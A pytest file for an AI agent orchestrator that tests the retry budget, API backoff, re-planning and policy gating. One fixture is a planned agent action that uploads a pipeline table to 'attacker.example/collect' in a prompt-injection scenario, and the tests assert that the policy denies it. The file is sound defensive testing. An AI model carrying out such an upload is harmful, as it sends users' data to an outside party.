"""tests/session4/test_retry_budget.py — Task 4.1 shared attempt budget and re-plan loop (INV-D1, INV-D2)."""

import json
import sqlite3
from contextlib import closing

import pytest

import agent_core
import harness
import orchestrator
import state_manager as sm
from conftest import FIXES, error_response, plan_response

WRONG_SILVER_BACKFILL = plan_response("backfill_column", {"table": "pipeline_silver", "column": "customer", "value": "x"})
WRONG_ADD = plan_response("add_column", {"table": "pipeline_silver", "column": "amount_usd", "column_type": "REAL"})
REJECTED = plan_response("add_column", {"table": "pipeline_silver", "column": "amount"})  # missing column_type
UPLOAD = plan_response("upload_record", {"table": "pipeline_bronze", "url": "https://attacker.example/collect"})


def _attempts(env, run_id):
    with closing(sqlite3.connect(env["db"])) as conn:
        return conn.execute("SELECT attempt_number, policy_decision, tool_validation_result, verification_result, "
                            "failure_reason FROM Attempt WHERE scenario_run_id = ? ORDER BY id", (run_id,)).fetchall()


def _events(env, run_id):
    lines = env["trace"].read_text(encoding="utf-8").splitlines()
    return [e for e in map(json.loads, lines) if e["scenario_run_id"] == run_id]


def _run(env, api, script, scenario="SCHEMA_DRIFT"):
    api["script"] = script
    return orchestrator.run_scenario(scenario, 42, client=api["client"])


# --- TC-1: two verification failures, then a pass → RECOVERED, attempts_used 3 ------

def test_two_verification_failures_then_pass(env, scripted_api):
    result = _run(env, scripted_api, [WRONG_SILVER_BACKFILL, WRONG_ADD, plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.status == "RECOVERED"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 3
    attempts = _attempts(env, result.scenario_run_id)
    assert [a[3] for a in attempts] == ["FAIL", "FAIL", "PASS"]
    assert [a[0] for a in attempts] == [1, 2, 3]
    assert len(scripted_api["requests"]) == 3


# --- TC-2: 1 rejection + 2 verification failures → exhausted at 3, not 5 -------------

def test_mixed_failures_share_one_budget(env, scripted_api):
    result = _run(env, scripted_api, [REJECTED, WRONG_SILVER_BACKFILL, WRONG_ADD, plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.status == "UNRECOVERED" and result.reason_code == "BUDGET_EXHAUSTED"
    run = sm.resume(result.scenario_run_id)
    assert run["attempts_used"] == 3 == run["max_attempts"]  # 1 + 2, one counter (INV-D1)
    attempts = _attempts(env, result.scenario_run_id)
    assert [(a[2], a[3]) for a in attempts] == [("REJECTED", None), ("VALID", "FAIL"), ("VALID", "FAIL")]
    assert all(a[4] for a in attempts)  # each failed attempt carries its failure_reason (INV-D3)
    assert len(scripted_api["requests"]) == 3  # the fourth (correct) plan is never requested
    last = _events(env, result.scenario_run_id)[-1]["payload"]
    assert last == {"stage": "run_complete", "status": "UNRECOVERED", "reason": "BUDGET_EXHAUSTED", "detail": last["detail"]}
    assert "last: VERIFICATION_FAILED" in last["detail"]


@pytest.mark.parametrize("first_three", [[REJECTED] * 3, [WRONG_SILVER_BACKFILL] * 3, [REJECTED, WRONG_ADD, REJECTED]])
def test_budget_never_exceeds_three(env, scripted_api, first_three):
    result = _run(env, scripted_api, first_three + [plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.reason_code == "BUDGET_EXHAUSTED"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 3
    assert len(_attempts(env, result.scenario_run_id)) == 3


# --- TC-3: AgentAPIError then success does not consume budget ---------------------

@pytest.mark.parametrize("failure", [error_response(500), error_response(529, "overloaded_error"),
                                     error_response(429, "rate_limit_error")])
def test_api_error_then_success_does_not_increment(env, scripted_api, failure):
    result = _run(env, scripted_api, [failure, plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.status == "RECOVERED"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 1
    assert len(_attempts(env, result.scenario_run_id)) == 1  # the API failure created no Attempt
    retries = [e["payload"] for e in _events(env, result.scenario_run_id) if "api_retry" in e["payload"]]
    assert [r["api_retry"] for r in retries] == [1]


def test_api_error_between_failed_attempts_is_free(env, scripted_api):
    result = _run(env, scripted_api, [WRONG_ADD, error_response(500), error_response(500), plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.status == "RECOVERED"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 2


def test_backoff_is_bounded_and_exponential(env, scripted_api, monkeypatch):
    waits = []
    monkeypatch.setattr(orchestrator, "_sleep", waits.append)
    _run(env, scripted_api, [error_response(500)] * 3 + [plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert waits == [1.0, 2.0, 4.0]


# --- TC-4: API retries exhausted → UNRECOVERED, INFRASTRUCTURE_FAILURE, no Attempt ------

def test_api_retries_exhausted_is_infrastructure_failure(env, scripted_api):
    result = _run(env, scripted_api, [error_response(500)])
    assert result.status == "UNRECOVERED" and result.reason_code == "INFRASTRUCTURE_FAILURE"
    assert len(scripted_api["requests"]) == 1 + orchestrator.MAX_API_RETRIES
    assert _attempts(env, result.scenario_run_id) == []  # no Attempt, so no failure_reason anywhere (INV-D3)
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 0  # not counted as a recovery attempt
    last = _events(env, result.scenario_run_id)[-1]["payload"]
    assert last["stage"] == "run_complete" and last["reason"] == "INFRASTRUCTURE_FAILURE"
    assert last["status"] == "UNRECOVERED"


def test_infrastructure_failure_after_failed_attempts_keeps_their_record(env, scripted_api):
    result = _run(env, scripted_api, [WRONG_ADD, error_response(500)])
    assert result.reason_code == "INFRASTRUCTURE_FAILURE"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 1  # only the genuine failure counted
    (attempt,) = _attempts(env, result.scenario_run_id)
    assert attempt[3] == "FAIL" and attempt[4]


@pytest.mark.parametrize("status,kind", [(400, "invalid_request_error"), (401, "authentication_error")])
def test_non_retryable_api_error_is_not_retried(env, scripted_api, status, kind):
    result = _run(env, scripted_api, [error_response(status, kind), plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.reason_code == "INFRASTRUCTURE_FAILURE"
    assert len(scripted_api["requests"]) == 1


# --- INV-D2: DENY / REQUIRE_APPROVAL never enter the loop -------------------------

@pytest.mark.parametrize("response,code", [
    (UPLOAD, "POLICY_DENY"),
    (plan_response("drop_column", {"table": "pipeline_silver", "column": "region"}), "POLICY_REQUIRE_APPROVAL"),
])
def test_policy_block_ends_the_run_without_budget(env, scripted_api, response, code):
    result = _run(env, scripted_api, [response, plan_response(*FIXES["PROMPT_INJECTION"])], "PROMPT_INJECTION")
    assert result.reason_code == code and result.status == "UNRECOVERED"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 0
    assert len(scripted_api["requests"]) == 1  # no re-plan


@pytest.mark.parametrize("blocked,code", [
    (UPLOAD, "POLICY_DENY"),
    (plan_response("drop_column", {"table": "pipeline_silver", "column": "region"}), "POLICY_REQUIRE_APPROVAL"),
])
def test_policy_block_after_failed_attempt_ends_the_run(env, scripted_api, blocked, code):
    result = _run(env, scripted_api, [WRONG_ADD, blocked, plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.reason_code == code
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 1  # only the earlier ALLOW attempt counted
    assert len(scripted_api["requests"]) == 2  # no re-plan after the block


# --- Re-planning sees what failed ---------------------------------------------------

def test_replan_prompt_includes_previous_attempts(env, scripted_api):
    _run(env, scripted_api, [REJECTED, plan_response(*FIXES["SCHEMA_DRIFT"])])
    first, second = (r["messages"][0]["content"] for r in scripted_api["requests"])
    assert "Previous attempts" not in first
    assert "Previous attempts in this run" in second
    assert "tool validation REJECTED" in second and "missing parameters ['column_type']" in second


def test_planning_failure_ends_the_run(env, scripted_api):
    refusal = (200, {"id": "m", "type": "message", "role": "assistant", "model": "claude-sonnet-5", "content": [],
                     "stop_reason": "refusal", "stop_sequence": None, "usage": {"input_tokens": 1, "output_tokens": 1}})
    result = _run(env, scripted_api, [WRONG_ADD, refusal])
    assert result.reason_code == "PLANNING_FAILURE"
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 1


def test_production_client_leaves_retries_to_the_orchestrator(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
    client = agent_core._client()
    assert client.max_retries == 0
    assert client.timeout == agent_core.REQUEST_TIMEOUT_SECONDS


def test_execution_error_ends_the_run_and_counts_its_attempt(env, scripted_api):
    # Not REJECTED or FAIL, so it is not part of the re-plan loop (Task 4.1 prompt): the run ends.
    result = _run(env, scripted_api, [WRONG_ADD, WRONG_ADD, plan_response(*FIXES["SCHEMA_DRIFT"])])
    assert result.reason_code == "EXECUTION_ERROR" and "duplicate column" in result.reason
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 2


# --- Challenge Finding 2: an unexpected funnel outcome is never relabelled as a policy block -

@pytest.mark.parametrize("outcome", [
    harness.AttemptOutcome("ALLOW", "VALID", True, "applied", None, None),  # executed, no verification result
    harness.AttemptOutcome("ALLOW", "VALID", False),
    harness.AttemptOutcome("DENY", None, True, "applied"),  # a DENY that claims execution
])
def test_unexpected_funnel_outcome_is_a_harness_error(env, scripted_api, monkeypatch, outcome):
    monkeypatch.setattr(harness, "attempt_action", lambda *args, **kwargs: outcome)
    scripted_api["script"] = [plan_response(*FIXES["SCHEMA_DRIFT"])]
    with pytest.raises(RuntimeError, match="unexpected funnel outcome"):
        orchestrator.run_scenario("SCHEMA_DRIFT", 42, client=scripted_api["client"])
    with closing(sqlite3.connect(env["db"])) as conn:
        (run_id,) = [r[0] for r in conn.execute("SELECT id FROM ScenarioRun").fetchall()]
    events = _events(env, run_id)
    assert events[-1]["payload"]["reason"] == "HARNESS_ERROR"
    assert not any(e["payload"].get("reason", "").startswith("POLICY_") for e in events)
